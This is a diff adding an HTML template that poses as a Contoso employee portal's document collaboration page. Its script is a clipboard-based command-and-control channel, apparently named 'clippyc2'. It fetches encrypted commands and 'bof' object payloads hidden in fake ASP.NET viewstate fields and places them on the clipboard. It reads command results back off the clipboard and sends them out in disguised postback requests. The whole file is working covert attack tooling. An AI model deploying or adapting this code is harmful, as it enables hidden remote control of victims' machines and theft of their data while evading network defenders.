@@ -1,0 +1,522 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Employee Portal - Document Services</title>
+    <style>
+        * { box-sizing: border-box; }
+        body {
+            margin: 0;
+            font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+            background: #f3f2f1;
+            color: #323130;
+        }
+        .topbar {
+            background: #0078d4;
+            color: #fff;
+            padding: 0.75rem 1.5rem;
+            font-size: 0.95rem;
+        }
+        .layout {
+            max-width: 960px;
+            margin: 1.5rem auto;
+            padding: 0 1rem 2rem;
+        }
+        .panel {
+            background: #fff;
+            border: 1px solid #edebe9;
+            box-shadow: 0 1.6px 3.6px rgba(0,0,0,.13);
+            padding: 1.5rem;
+        }
+        h1 { margin: 0 0 0.25rem; font-size: 1.5rem; font-weight: 600; }
+        .subtitle { color: #605e5c; margin-bottom: 1.25rem; font-size: 0.9rem; }
+        label { display: block; font-size: 0.8rem; color: #605e5c; margin-bottom: 0.35rem; }
+        textarea {
+            width: 100%;
+            resize: none;
+            padding: 0.75rem;
+            border: 1px solid #8a8886;
+            background: #faf9f8;
+            color: #323130;
+            margin-bottom: 1rem;
+            font-family: Consolas, "Courier New", monospace;
+            font-size: 0.85rem;
+        }
+        .hidden-fields { display: none; }
+        .status {
+            font-size: 0.8rem;
+            color: #605e5c;
+            min-height: 1.1rem;
+        }
+        .status.warn { color: #797775; }
+        .status.err { color: #a4262c; }
+        .footer {
+            margin-top: 1rem;
+            font-size: 0.75rem;
+            color: #a19f9d;
+        }
+    </style>
+</head>
+<body>
+    <div class="topbar">Contoso Ltd &mdash; Employee Portal</div>
+    <div class="layout">
+        <form id="form1" class="panel" method="get" action="Default.aspx">
+            <h1>Document Collaboration</h1>
+            <p class="subtitle">Synchronizing shared workspace content. Keep this window active while collaboration is enabled.</p>
+
+            <div class="hidden-fields" aria-hidden="true">
+                <input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="" />
+                <input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="{{ viewstate_generator }}" />
+                <input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="" />
+                <input type="hidden" name="__EVENTTARGET" id="__EVENTTARGET" value="" />
+                <input type="hidden" name="__EVENTARGUMENT" id="__EVENTARGUMENT" value="" />
+            </div>
+
+            <label for="serverContent">Inbound workspace payload</label>
+            <textarea id="serverContent" rows="6" readonly placeholder="Awaiting server update..."></textarea>
+
+            <label for="clipboardContent">Local clipboard mirror</label>
+            <textarea id="clipboardContent" rows="6" readonly placeholder="Initializing clipboard bridge..."></textarea>
+
+            <div id="messageArea" class="status" aria-live="polite"></div>
+            <div class="footer">Microsoft ASP.NET Web Forms 4.8 &bull; Session managed automatically</div>
+        </form>
+    </div>
+
+    <script>
+        const POLLING_INTERVAL_MS = {{ poll_interval_ms }};
+        const VIEWSTATE_GENERATOR = {{ viewstate_generator|tojson }};
+        const ENCRYPTION_KEY_B64 = {{ encryption_key_b64|tojson }};
+        const CLIPBOARD_READ_RETRIES = 3;
+        const EVENT_TARGET_SYNC = 'ctl00$ContentPlaceHolder1$UpdatePanel1';
+        const EVENT_TARGET_RESET = 'ctl00$ContentPlaceHolder1$btnReset';
+        const VIEWSTATE_MARKER = [0xFF, 0x01];
+
+        const messageArea = document.getElementById('messageArea');
+        const clipboardContent = document.getElementById('clipboardContent');
+        const serverContent = document.getElementById('serverContent');
+        const hiddenViewstate = document.getElementById('__VIEWSTATE');
+        const hiddenEventValidation = document.getElementById('__EVENTVALIDATION');
+
+        let lastWrittenCommand = '';
+        let awaitingResult = false;
+        let awaitingResultId = '';
+        let monitoring = false;
+        let scriptNonce = 0;
+        let syncCountdown = POLLING_INTERVAL_MS / 1000;
+        let holdCountdown = false;
+        let cryptoKeyPromise = null;
+
+        const fetchOptions = { credentials: 'same-origin', cache: 'no-store' };
+
+        const UUID_PATTERN = /^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$/;
+        const formatCommandClipboard = (payload) => {
+            const body = { ...payload };
+            delete body.id;
+            return `c:${payload.id}:${JSON.stringify(body)}`;
+        };
+        const isValidCommandPayload = (payload) => {
+            if (!payload || !payload.id || !UUID_PATTERN.test(payload.id)) {
+                return false;
+            }
+            if (payload.type === 'bof') {
+                return Boolean(payload.object_b64);
+            }
+            return Boolean(payload.cmd);
+        };
+        const isCommandClipboard = (text) => /^c:[0-9a-fA-F-]{36}:/.test(text);
+        const isResultClipboard = (text) => {
+            if (!text.startsWith('r:')) {
+                return false;
+            }
+            const headerEnd = text.indexOf('\n');
+            const resultId = (headerEnd === -1 ? text.slice(2) : text.slice(2, headerEnd)).trim();
+            return UUID_PATTERN.test(resultId);
+        };
+
+        const AWAITING_KEY = 'clippyc2.awaitingId';
+
+        const parseCommandId = (text) => {
+            const match = text.match(/^c:([0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}):/);
+            return match ? match[1] : '';
+        };
+
+        const parseResultId = (text) => {
+            if (!text.startsWith('r:')) {
+                return '';
+            }
+            const headerEnd = text.indexOf('\n');
+            const resultId = (headerEnd === -1 ? text.slice(2) : text.slice(2, headerEnd)).trim();
+            return UUID_PATTERN.test(resultId) ? resultId : '';
+        };
+
+        const setAwaiting = (commandId) => {
+            awaitingResult = true;
+            awaitingResultId = commandId;
+            sessionStorage.setItem(AWAITING_KEY, commandId);
+        };
+
+        const clearAwaiting = () => {
+            awaitingResult = false;
+            awaitingResultId = '';
+            lastWrittenCommand = '';
+            sessionStorage.removeItem(AWAITING_KEY);
+        };
+
+        const restoreAwaiting = () => {
+            const stored = sessionStorage.getItem(AWAITING_KEY);
+            if (stored && UUID_PATTERN.test(stored)) {
+                awaitingResult = true;
+                awaitingResultId = stored;
+            }
+        };
+
+        const resetSyncCountdown = () => {
+            syncCountdown = POLLING_INTERVAL_MS / 1000;
+        };
+
+        const setMessage = (text, level = '', hold = false) => {
+            messageArea.textContent = text;
+            messageArea.className = `status ${level}`.trim();
+            if (hold) {
+                holdCountdown = true;
+                setTimeout(() => {
+                    holdCountdown = false;
+                }, 3000);
+            }
+        };
+
+        const showCountdown = () => {
+            messageArea.textContent = `Next sync in ${syncCountdown}s`;
+            messageArea.className = 'status';
+        };
+
+        const bytesToBase64 = (bytes) => {
+            let binary = '';
+            for (let i = 0; i < bytes.length; i += 1) {
+                binary += String.fromCharCode(bytes[i]);
+            }
+            return btoa(binary);
+        };
+
+        const base64ToBytes = (value) => {
+            const binary = atob(value);
+            const bytes = new Uint8Array(binary.length);
+            for (let i = 0; i < binary.length; i += 1) {
+                bytes[i] = binary.charCodeAt(i);
+            }
+            return bytes;
+        };
+
+        const importEncryptionKey = () => {
+            if (!cryptoKeyPromise) {
+                cryptoKeyPromise = crypto.subtle.importKey(
+                    'raw',
+                    base64ToBytes(ENCRYPTION_KEY_B64),
+                    { name: 'AES-GCM' },
+                    false,
+                    ['encrypt', 'decrypt']
+                );
+            }
+            return cryptoKeyPromise;
+        };
+
+        const encryptText = async (plaintext) => {
+            const key = await importEncryptionKey();
+            const iv = crypto.getRandomValues(new Uint8Array(12));
+            const encoded = new TextEncoder().encode(plaintext);
+            const ciphertext = await crypto.subtle.encrypt({ name: 'AES-GCM', iv }, key, encoded);
+            const combined = new Uint8Array(iv.length + ciphertext.byteLength);
+            combined.set(iv);
+            combined.set(new Uint8Array(ciphertext), iv.length);
+            return `v1:${bytesToBase64(combined)}`;
+        };
+
+        const decryptText = async (blob) => {
+            if (!blob.startsWith('v1:')) {
+                throw new Error('Unknown ciphertext format');
+            }
+            const raw = base64ToBytes(blob.slice(3));
+            const iv = raw.slice(0, 12);
+            const ciphertext = raw.slice(12);
+            const key = await importEncryptionKey();
+            const decrypted = await crypto.subtle.decrypt({ name: 'AES-GCM', iv }, key, ciphertext);
+            return new TextDecoder().decode(decrypted);
+        };
+
+        const wrapEncryptedPayload = async (plaintext) => {
+            const encrypted = await encryptText(plaintext);
+            return wrapPayload(encrypted);
+        };
+
+        const unwrapEncryptedPayload = async (viewstateB64) => {
+            const encrypted = unwrapViewstate(viewstateB64);
+            return decryptText(encrypted);
+        };
+
+        const randomBytes = (length) => {
+            const bytes = new Uint8Array(length);
+            crypto.getRandomValues(bytes);
+            return bytes;
+        };
+
+        const randomGenerator = () => {
+            const bytes = randomBytes(4);
+            return Array.from(bytes, (b) => b.toString(16).padStart(2, '0')).join('').toUpperCase();
+        };
+
+        const randomEventValidation = () => bytesToBase64(randomBytes(48));
+
+        const wrapPayload = (plaintext) => {
+            const payload = new TextEncoder().encode(plaintext);
+            const length = payload.length;
+            const lengthBytes = new Uint8Array(4);
+            new DataView(lengthBytes.buffer).setUint32(0, length, false);
+
+            const padding = randomBytes(12 + Math.floor(Math.random() * 24));
+            const body = new Uint8Array(2 + 4 + length + padding.length);
+            body.set(VIEWSTATE_MARKER, 0);
+            body.set(lengthBytes, 2);
+            body.set(payload, 6);
+            body.set(padding, 6 + length);
+
+            return {
+                __VIEWSTATE: bytesToBase64(body),
+                __VIEWSTATEGENERATOR: randomGenerator(),
+                __EVENTVALIDATION: randomEventValidation(),
+            };
+        };
+
+        const unwrapViewstate = (viewstateB64) => {
+            const raw = base64ToBytes(viewstateB64);
+            if (raw.length < 6 || raw[0] !== VIEWSTATE_MARKER[0] || raw[1] !== VIEWSTATE_MARKER[1]) {
+                throw new Error('Invalid viewstate');
+            }
+            const length = new DataView(raw.buffer, raw.byteOffset + 2, 4).getUint32(0, false);
+            const start = 6;
+            const end = start + length;
+            if (end > raw.length) {
+                throw new Error('Invalid viewstate length');
+            }
+            return new TextDecoder().decode(raw.slice(start, end));
+        };
+
+        const parseScriptResource = (body) => {
+            const viewstateMatch = body.match(/__vs='([^']*)'/);
+            if (!viewstateMatch || !viewstateMatch[1]) {
+                return '';
+            }
+            return viewstateMatch[1];
+        };
+
+        const buildPostbackUrl = (fields, eventTarget = EVENT_TARGET_SYNC) => {
+            const params = new URLSearchParams();
+            params.set('__EVENTTARGET', eventTarget);
+            params.set('__EVENTARGUMENT', '');
+            params.set('__VIEWSTATE', fields.__VIEWSTATE);
+            params.set('__VIEWSTATEGENERATOR', fields.__VIEWSTATEGENERATOR);
+            params.set('__EVENTVALIDATION', fields.__EVENTVALIDATION);
+            params.set('_', String(Date.now()));
+            return `/Default.aspx?${params.toString()}`;
+        };
+
+        const writeToClipboard = async (text) => {
+            if (!navigator.clipboard?.writeText) {
+                setMessage('Clipboard write is unavailable in this context.', 'err');
+                return false;
+            }
+            try {
+                lastWrittenCommand = text;
+                setAwaiting(parseCommandId(text));
+                await navigator.clipboard.writeText(text);
+                setMessage(`Workspace payload copied at ${new Date().toLocaleTimeString()}`, '', true);
+                return true;
+            } catch (err) {
+                clearAwaiting();
+                setMessage('Clipboard write requires an active browser tab.', 'err');
+                return false;
+            }
+        };
+
+        const checkServerText = async () => {
+            try {
+                scriptNonce += 1;
+                const response = await fetch(
+                    `/ScriptResource.axd?d=${scriptNonce}&t=${VIEWSTATE_GENERATOR}&_=${Date.now()}`,
+                    fetchOptions
+                );
+                if (!response.ok) {
+                    return;
+                }
+
+                const body = await response.text();
+                const viewstate = parseScriptResource(body);
+                if (!viewstate) {
+                    if (serverContent.value !== '' && !awaitingResult) {
+                        serverContent.value = '';
+                        hiddenViewstate.value = '';
+                    }
+                    return;
+                }
+
+                let decodedText = '';
+                let payload = null;
+                try {
+                    payload = JSON.parse(await unwrapEncryptedPayload(viewstate));
+                    if (!isValidCommandPayload(payload)) {
+                        throw new Error('Invalid command payload');
+                    }
+                    decodedText = formatCommandClipboard(payload);
+                } catch (err) {
+                    decodedText = '[Error: invalid inbound payload]';
+                }
+
+                if (payload && awaitingResult) {
+                    if (payload.id !== awaitingResultId) {
+                        return;
+                    }
+                    serverContent.value = decodedText;
+                    hiddenViewstate.value = viewstate;
+                    if (!navigator.clipboard?.readText) {
+                        return;
+                    }
+                    try {
+                        const clip = await navigator.clipboard.readText();
+                        if (isCommandClipboard(clip) && parseCommandId(clip) === awaitingResultId) {
+                            lastWrittenCommand = clip;
+                            return;
+                        }
+                        if (isResultClipboard(clip) && parseResultId(clip) === awaitingResultId) {
+                            return;
+                        }
+                        await writeToClipboard(decodedText);
+                    } catch (err) {
+                        setMessage('Clipboard resync failed.', 'warn', true);
+                    }
+                    return;
+                }
+
+                if (payload && navigator.clipboard?.readText) {
+                    try {
+                        const clip = await navigator.clipboard.readText();
+                        if (isCommandClipboard(clip) && parseCommandId(clip) === payload.id) {
+                            serverContent.value = decodedText;
+                            hiddenViewstate.value = viewstate;
+                            lastWrittenCommand = clip;
+                            setAwaiting(payload.id);
+                            return;
+                        }
+                    } catch (err) {
+                        // ignore clipboard read errors during sync
+                    }
+                }
+
+                if (decodedText !== serverContent.value) {
+                    serverContent.value = decodedText;
+                    hiddenViewstate.value = viewstate;
+                    await writeToClipboard(decodedText);
+                }
+            } catch (err) {
+                if (monitoring) {
+                    setMessage('Update panel refresh failed.', 'warn', true);
+                }
+            }
+        };
+
+        const logClipboardChange = async (text) => {
+            if (!text || isCommandClipboard(text) || text === lastWrittenCommand) {
+                return;
+            }
+            if (!isResultClipboard(text)) {
+                return;
+            }
+
+            try {
+                const fields = await wrapEncryptedPayload(text);
+                hiddenViewstate.value = fields.__VIEWSTATE;
+                hiddenEventValidation.value = fields.__EVENTVALIDATION;
+                await fetch(buildPostbackUrl(fields), fetchOptions);
+                clearAwaiting();
+            } catch (err) {
+                setMessage('Postback synchronization failed.', 'warn', true);
+            }
+        };
+
+        const checkClipboard = async () => {
+            if (!document.hasFocus()) {
+                setMessage('Clipboard bridge paused while tab is inactive.', 'warn', true);
+                return;
+            }
+
+            for (let attempt = 0; attempt < CLIPBOARD_READ_RETRIES; attempt += 1) {
+                try {
+                    const text = await navigator.clipboard.readText();
+                    if (text !== clipboardContent.value) {
+                        clipboardContent.value = text;
+                        setMessage(`Clipboard mirror updated at ${new Date().toLocaleTimeString()}`, '', true);
+                        await logClipboardChange(text);
+                    }
+                    return;
+                } catch (err) {
+                    if (attempt === CLIPBOARD_READ_RETRIES - 1) {
+                        setMessage('Clipboard read failed; will retry.', 'warn', true);
+                    }
+                }
+            }
+        };
+
+        const startMonitoring = async () => {
+            if (!navigator.clipboard?.readText) {
+                setMessage('Clipboard API is not available.', 'err');
+                return;
+            }
+
+            try {
+                restoreAwaiting();
+                const text = await navigator.clipboard.readText();
+                clipboardContent.value = text;
+                if (isCommandClipboard(text)) {
+                    lastWrittenCommand = text;
+                    setAwaiting(parseCommandId(text));
+                } else if (isResultClipboard(text)) {
+                    await logClipboardChange(text);
+                }
+
+                monitoring = true;
+                resetSyncCountdown();
+            } catch (err) {
+                setMessage('Clipboard permission was not granted.', 'err');
+            }
+        };
+
+        const runSyncCycle = async () => {
+            resetSyncCountdown();
+            if (monitoring) {
+                await checkClipboard();
+            }
+            await checkServerText();
+        };
+
+        setInterval(() => {
+            if (!monitoring || holdCountdown) {
+                return;
+            }
+            syncCountdown -= 1;
+            if (syncCountdown <= 0) {
+                syncCountdown = POLLING_INTERVAL_MS / 1000;
+            }
+            showCountdown();
+        }, 1000);
+
+        document.addEventListener('visibilitychange', () => {
+            if (document.visibilityState === 'visible' && monitoring) {
+                runSyncCycle();
+            }
+        });
+
+        setInterval(runSyncCycle, POLLING_INTERVAL_MS);
+        startMonitoring().then(() => runSyncCycle());
+    </script>
+</body>
+</html>
